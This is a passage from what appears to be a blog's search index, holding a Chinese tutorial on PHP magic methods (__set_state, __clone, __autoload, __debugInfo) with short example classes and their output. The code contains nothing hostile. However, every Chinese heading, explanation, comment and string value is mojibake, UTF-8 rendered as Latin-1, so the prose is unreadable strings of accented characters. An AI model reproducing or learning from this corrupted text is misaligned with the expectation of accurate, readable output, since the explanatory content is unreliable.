<h4 id="13-set-state-ï¼Œè°ƒç”¨var-export-å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨"><a href="#13-set-state-ï¼Œè°ƒç”¨var-export-å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨" class="headerlink" title="13.__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨"></a>13.__set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨</h4><p>å½“è°ƒç”¨ var_export() å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p>
<h4 id="14-clone-ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨"><a href="#14-clone-ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨" class="headerlink" title="14.__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨"></a>14.__clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;ç”·&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123; //å¤åˆ¶æ—¶è‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•</span><br><span class="line">        echo &quot;æ­£åœ¨å¤åˆ¶&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;å°æ˜&#x27;);</span><br><span class="line">$h1=clone $h; //å¤åˆ¶çš„è¯­æ³•</span><br><span class="line">var_dump($h);//è¾“å‡ºåŸæ¥çš„æ•°æ®</span><br><span class="line">var_dump($h1);//è¾“å‡ºå¤åˆ¶å®Œæˆåçš„æ•°æ®</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<p>æ­£åœ¨å¤åˆ¶user Object ( [sex] &#x3D;&gt; ç”· [name] &#x3D;&gt; å°æ˜ [age] &#x3D;&gt; 25 )<br>user Object ( [sex] &#x3D;&gt; ç”· [name] &#x3D;&gt; å°æ˜ [age] &#x3D;&gt; 25 )</p>
<h4 id="15-autoload-ï¼Œå®ç°è‡ªåŠ¨åŠ è½½"><a href="#15-autoload-ï¼Œå®ç°è‡ªåŠ¨åŠ è½½" class="headerlink" title="15.__autoload()ï¼Œå®ç°è‡ªåŠ¨åŠ è½½"></a>15.__autoload()ï¼Œå®ç°è‡ªåŠ¨åŠ è½½</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨phpä¸­ä¸€èˆ¬ä¸€ä¸ªç±»ä¸ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨ç±»æ—¶éœ€è¦ä½¿ç”¨include()å‡½æ•°è¿›è¡Œä¸€ä¸ªä¸€ä¸ªçš„åŒ…å«æ‰å¯ä»¥ä½¿ç”¨ï¼Œè¿™æ ·è€—æ—¶å¤ªå¤šï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨__autoload()å‡½æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ä¸€æ¬¡__autoload()å‡½æ•°å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ç±»ï¼Œæ— éœ€ä½¿ç”¨include()å‡½æ•°å°†æ¯ä¸ªç±»åŒ…å«è¿›æ¥</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*user.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo &quot;wo&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*5.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">function __autoload($classname)&#123;</span><br><span class="line">    $classpath=$classname.&quot;.php&quot;;//$classnameå‚æ•°ä¼šè‡ªåŠ¨æ¢ä¸ºæˆ‘ä»¬æ‰€ä½¿ç”¨çš„ç±»åï¼Œ</span><br><span class="line">    if(file_exists($classpath))&#123;  //æ£€éªŒè¿™ä¸ªè¿™ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><span class="line">        require_once ($classpath);  //è¿æ¥è¯¥æ–‡ä»¶</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;not found&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();  //ç›´æ¥ä½¿ç”¨è¯¥ç±»</span><br><span class="line">echo $h-&gt;show();</span><br><span class="line"></span><br><span class="line">åœ¨5.phpä¸­è¾“å‡ºä¸ºwo</span><br></pre></td></tr></table></figure>



<h4 id="16-debugInfo-ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯"><a href="#16-debugInfo-ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯" class="headerlink" title="16.__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯"></a>16.__debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</h4>]]></content>
  </entry>
</search>
